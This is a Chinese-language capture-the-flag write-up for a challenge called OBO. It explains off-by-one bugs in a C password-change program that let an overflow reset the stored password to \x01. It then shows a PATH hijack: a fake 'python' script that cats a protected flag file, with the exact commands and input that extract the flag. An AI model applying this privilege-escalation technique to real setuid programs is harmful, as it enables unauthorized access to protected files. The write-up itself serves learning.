# OBO
拿到一個[更改密碼的程式碼](obo.c)，一眼能看出許多地方有邊界錯誤：
 * 在generate_hex_table 這個程式裡：
```c
hex_table[256];
...
for (i = 0; i <= 256; ++i) hex_table[i] = -1;
for (i = 0; i <= 10; ++i) hex_table['0' + i] = i;
for (i = 0; i <= 6; ++i) hex_table['a' + i] = 10 + i;
for (i = 0; i <= 6; ++i) hex_table['A' + i] = 10 + i;
// I don't know why, but I was getting errors, and this fixes it.
hex_table[0] = 0;
```
 * 提示說：如果能找出為何會產生error，和為何加上這行
```c
hex_table[0] = 0;
```
  可以讓程式正常運行的原因，就可以破解這關了。
 * 在檢查新輸入的密碼是否夠複雜的程式碼：
```c
for (i = 0; i <= strlen(new_password); ++i) {
	int index = hex_table[(unsigned char) new_password[i]];
	if (index == -1) {
	   printf("Invalid character: %c\n", new_password[i]);
	   exit(1);
	}
	digits[index] = 1;
}
```
  可以看到因為邊界錯誤，把不該檢查的結束字元'\0'也做複雜度檢查，這就是為什麼上面要加入
```c
hex_table[0] = 0;
```
  才會正常運行的原因。
 * 同理，也可以看到digits的邊界也超出了一格，這超出的一格會以**int長度為單位**複寫stack上緊鄰的東西，也就是password！
 * 注意到sizeof(int) = 4 byte, 而sizeof(char) = 1 byte，所以password的前四格會被覆寫成[1][0][0][0]，也就是說password變成了：*\x01*！
 * 那麼，接下來只剩下更改password的部份了。但很不幸的，這部份還沒有implement，我們需要找其他方法。
 * 仔細看一下呼叫python的code：
```c
snprintf(cmd, sizeof(cmd), "python set_password.py \"%s\"", password);
```
  是用相對路徑開啟，所以說不定我們能複製創一個set_password.py在另一個目錄下，印出flag：
```bash
#!/bin/sh
cat /home/obo/flag.txt
```
  我放到自己的目錄底下/home_users/pico62895，但很可惜，obo在這裡不能開啟password所以失敗，早該預料到的。
 * 那麼剩下調整環境變數，創一個叫作python的script檔，在export到PATH中：
```bash
pico62895@shell:~$ vim python
#!/bin/sh
cat /home/obo/flag.txt
pico62895@shell:~$ chmod +x python
pico62895@shell:~$ export PATH=/home_users/pico62895:$PATH
#!/bin/sh
cat /home/obo/flag.txt
```
 * 然後再執行程式：
```bash
pico62895@shell:~$ (echo -e "123456789abcdefg\n\x01") | /home/obo/obo
New password: Confirm old password: watch_your_bounds
Password changed!
```
 * 成功取得 flag = watch_your_bounds。
